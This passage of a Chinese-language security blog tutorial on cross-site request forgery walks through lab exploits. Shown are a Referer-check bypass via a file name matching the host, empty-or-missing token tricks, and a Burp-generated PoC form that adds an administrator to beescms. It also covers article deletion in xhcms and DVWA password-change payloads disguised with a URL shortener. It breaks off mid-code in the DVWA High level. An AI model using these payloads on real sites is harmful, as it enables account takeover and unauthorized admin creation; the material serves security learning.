class="variable">$_REQUEST</span>[ <span class="string">&#x27;money&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="variable">$money</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;向 <span class="subst">$user</span> 转账成功，金额为 <span class="subst">$money</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先读懂代码，首先了解一下<code>stripos</code>​函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stripos：查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">mixed stripos( string $haystack, string $needle)</span><br><span class="line">返回在字符串 haystack 中 needle 首次出现的数字位置。 </span><br></pre></td></tr></table></figure>

<p>然后我们看一下这个函数里的变量<br>​<code>$_SERVER[ &#39;HTTP_REFERER&#39; ]</code>​的话就是获取Referer头，识别请求来源<br>这个<code>$_SERVER[ &#39;SERVER_NAME&#39; ]</code>​其实也就是<code>$_SERVER[&#39;SERVER_NAME&#39;] : $_SERVER[&#39;SERVER_PORT&#39;]</code>​，可以理解为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_HOST&#x27;] = $_SERVER[&#x27;SERVER_NAME&#x27;] : $_SERVER[&#x27;SERVER_PORT&#x27;]</span><br></pre></td></tr></table></figure>

<p>这里的话其实就是获取个ip地址，然后呢，看与Referer头中是否一致，一致的话就传值，否则就PASS，我们这里抓个银行界面的包</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149243_62f3ddfbb7c62feda5590.jpeg" class="" title="在这里插入图片描述">  
<p>我这里的话看起来是一致的，是因为我是本地测试，导致请求界面与后端界面一致，而实际情况中我们想实现CSRF的话，Referer肯定与Host是不一致的，那此时检测Referer头与Host不一致，就会被PASS，但是我们细细的想一下，我们本机的Referer头包括我们的文件名，我们的文件名是可控的，如果我们修改文件名，让它与Host保持一致，此时是不是就也满足了检测条件呢，我们测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="string">&quot;http://133.223.464.532/168.134.132.166.php&quot;</span> ,<span class="string">&quot;168.134.132.166&quot;</span>) !== <span class="literal">false</span> ) &#123;</span><br><span class="line"><span class="comment">//http://133.223.464.532/168.134.132.166.php是我们的Referer头，168.134.132.166是Host。</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;成功绕过&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149244_62f3ddfc894a37f7d1fe6.jpeg" class="" title="在这里插入图片描述">  
<p>所以我们这里的话，就可以通过更换文件名，来实现绕过<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149245_62f3ddfd33abdfd614641.jpeg" class="" title="在这里插入图片描述"><br>转账成功，实现CSRF</p>
<h3 id="绕过Token"><a href="#绕过Token" class="headerlink" title="绕过Token"></a>绕过Token</h3><p>一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。</p>
<blockquote>
<p>1、删除token参数<br>2、发送空token</p>
</blockquote>
<p>当不发生Token时也可以正常请求数据，这种逻辑错误有时候也是可以遇见的，应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性，此时我们就可以尝试上面的两种方法绕过<br>示例<br>正常的请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /bank.com</span><br><span class="line">POST body:</span><br><span class="line">user=hacker&amp;money=<span class="number">100</span>&amp;token=<span class="number">283</span>caef0757a4ac9841dasb9ccd8b86a</span><br></pre></td></tr></table></figure>

<p>我们可以尝试这样请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /bank.com</span><br><span class="line">POST body:</span><br><span class="line">user=hacker&amp;money=<span class="number">100</span>&amp;token=</span><br></pre></td></tr></table></figure>

<p>或者这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /bank.com</span><br><span class="line">POST body:</span><br><span class="line">user=hacker&amp;money=<span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>此时就可能成功绕过</p>
<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><p>CSRF的话，肯定是利用管理员的权限来进行某些操作，所以我们在进行代码审计的时候，可以关注一下后台文件，看是否存在CSRF漏洞</p>
<h3 id="xhcms"><a href="#xhcms" class="headerlink" title="xhcms"></a>xhcms</h3><p>登录后台界面，发现有删除文章的权限<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149246_62f3ddfe13f6b8fb93491.jpeg" class="" title="在这里插入图片描述"><br>抓删除文件时的包<br>发送到重放模块，利用bp自带的<code>CSRF poc</code>​进行恶意语句构造<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149246_62f3ddfeead0abb882445.jpeg" class="" title="在这里插入图片描述"><br>可以发现这里是未检测token的，因此是极有可能存在CSRF的，我们复制到文件中并命名为<code>xhcms.html</code>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149247_62f3ddffd913cdbc832eb.jpeg" class="" title="在这里插入图片描述"><br>点击访问<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149248_62f3de00785d7b76de722.jpeg" class="" title="在这里插入图片描述"><br>访问<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149249_62f3de015dc75f1391102.jpeg" class="" title="在这里插入图片描述">​</p>
<blockquote>
<p>注意：这个是在同一个浏览器下的情况，此时只有这个浏览器上仍然存有管理员的信息，能够直接执行语句，当换到其他浏览器时，就无法执行删除语句，访问会跳转到登录界面</p>
</blockquote>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149250_62f3de025fdce1e50bb02.jpeg" class="" title="在这里插入图片描述">​

<h3 id="beescms"><a href="#beescms" class="headerlink" title="beescms"></a>beescms</h3><p>登录后台，发现有添加管理员界面，随便输入一下<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149251_62f3de033ab04afc2cb06.jpeg" class="" title="在这里插入图片描述"><br>抓包，发送到重放模块<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149252_62f3de045b565e06b3e14.jpeg" class="" title="在这里插入图片描述">​</p>
<p>未发现Token，可能存在CSRF，这个时候我们自定义信息，接下来利用bp构造poc，得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.<span class="title function_ invoke__">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://127.0.0.1:8080/beescms/admin/admin_admin.php?nav=list_admin_user&amp;admin_p_nav=user&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_name&quot;</span> value=<span class="string">&quot;1231&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_password&quot;</span> value=<span class="string">&quot;1231&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_password2&quot;</span> value=<span class="string">&quot;1231&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_nich&quot;</span> value=<span class="string">&quot;1231&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;purview&quot;</span> value=<span class="string">&quot;1&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_admin&quot;</span> value=<span class="string">&quot;1231&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_mail&quot;</span> value=<span class="string">&quot;1@qq.com		&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;admin_tel&quot;</span> value=<span class="string">&quot;1234&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;is_disable&quot;</span> value=<span class="string">&quot;0&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;save_admin&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç¡®å®š&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>复制到文件中并命名为beescms.html<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149253_62f3de0519414f0e55fb0.jpeg" class="" title="在这里插入图片描述"><br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149253_62f3de05c3e6535b1a62e.jpeg" class="" title="在这里插入图片描述">​</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149254_62f3de064f3c53d621fd0.jpeg" class="" title="在这里插入图片描述">  
<p>管理员添加成功</p>
<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149254_62f3de06e2404ac4beac9.jpeg" class="" title="在这里插入图片描述">  
<p>发现输入修改密码界面，随便输入一下尝试<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149255_62f3de07a7a1de55a514e.jpeg" class="" title="在这里插入图片描述"><br>发现url变化，说明是GET传参，我们可以进行自己构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></figure>

<p>访问<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149256_62f3de08a2eccb6799d3c.jpeg" class="" title="在这里插入图片描述"><br>直接修改了密码，这里的话可见应该是没有什么防护的，但是这个的话在实战中也太明显了，就算构造出了链接，受害者一眼就能看出来这个是修改密码的，也就意味着无法实现CSRF了，这个时候我们该怎么办呢，可以用短链接来缩短链接，给它伪装一下，短链接生成网址<br><a href="https://www.duanlianjie.net/">https://www.duanlianjie.net/</a><br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149257_62f3de09cfdccc49c79fe.jpeg" class="" title="在这里插入图片描述"><br>访问这个网址，观察url变化<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149258_62f3de0ab364e9d90e3da.jpeg" class="" title="在这里插入图片描述"><img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149259_62f3de0b543998274ec05.jpeg" class="" title="在这里插入图片描述">​</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149260_62f3de0c0bd1deee24ab4.jpeg" class="" title="在这里插入图片描述">  
<p>成功修改密码。<br>此时来看一下源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不难看出代码中的过滤方式是<code>mysqli_real_escape_string</code>​函数，这个函数的作用是<code>转义特殊字符</code>​，那么在这里的话它对CSRF是没有影响的，这里的话其实还有一种攻击方式，就是利用burpsuite自带的CSRF poc进行构造，具体过程如下<br>我们先随便输入一下，然后抓包</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149260_62f3de0cce9398ea6596e.jpeg" class="" title="在这里插入图片描述">  
<p>利用burpsuite自带的CSRF工具进行构造<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149261_62f3de0daa9c4499c7a11.jpeg" class="" title="在这里插入图片描述"><br>放入html文件中，而后访问（此时携带了刚刚在dvwa中的cookie）<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149262_62f3de0e97c5496534044.jpeg" class="" title="在这里插入图片描述">​</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149263_62f3de0f3126ff4b964ef.jpeg" class="" title="在这里插入图片描述">  
<p>成功修改</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>看一下源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加了Refeerer头检验，这个的话是要求来自同一个域，其实也就是要求访问的必须是本地的，但<code>Referer</code>​请求头是可以伪造的，具体过程如下<br>简单输入抓包<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149263_62f3de0fd76c07614981c.jpeg" class="" title="在这里插入图片描述">​</p>
<p>这里的话可以看见本地的Referer是127.0.0.1，和Host的是一致的，但正常的情况下是不一致的，Host一般是受害者的，而Referer来源于攻击者</p>
<blockquote>
<p>比如Host的地址为192.134.164.132，这个时候攻击者的ip肯定是与Host的不同的，假设是186.123.134.265，这个时候如果请求的话，Referer是<a href="http://186.123.134.265，就会因为Referer中不包含192.134.164.132">http://186.123.134.265，就会因为Referer中不包含192.134.164.132</a> 而无法修改密码，但如果我们文件名包含这个Host地址，那Referer就会变成<a href="http://186.123.134.265/192.134.164.132.html，此时就包含了Host地址，就可以成功修改密码，实现CSRF">http://186.123.134.265/192.134.164.132.html，此时就包含了Host地址，就可以成功修改密码，实现CSRF</a></p>
</blockquote>
<p>说了这么多，我们现在来自己进行测试一下，利用burpsuite构造出POC<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149264_62f3de108d18edde6b4ce.jpeg" class="" title="在这里插入图片描述">​</p>
<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149265_62f3de1155eaa2cd408e1.jpeg" class="" title="在这里插入图片描述">  
<p>构造一个html文件，然后将内容复制进去<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149266_62f3de122852f7f223e2c.jpeg" class="" title="在这里插入图片描述"><br>点击访问<br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149266_62f3de12d3b424d703b1c.jpeg" class="" title="在这里插入图片描述"><br>​<img src="/2023/10/23/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/1660149267_62f3de13623815be4ca15.jpeg" class="" title="在这里插入图片描述"><br>成功修改密码，实现CSRF</p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span 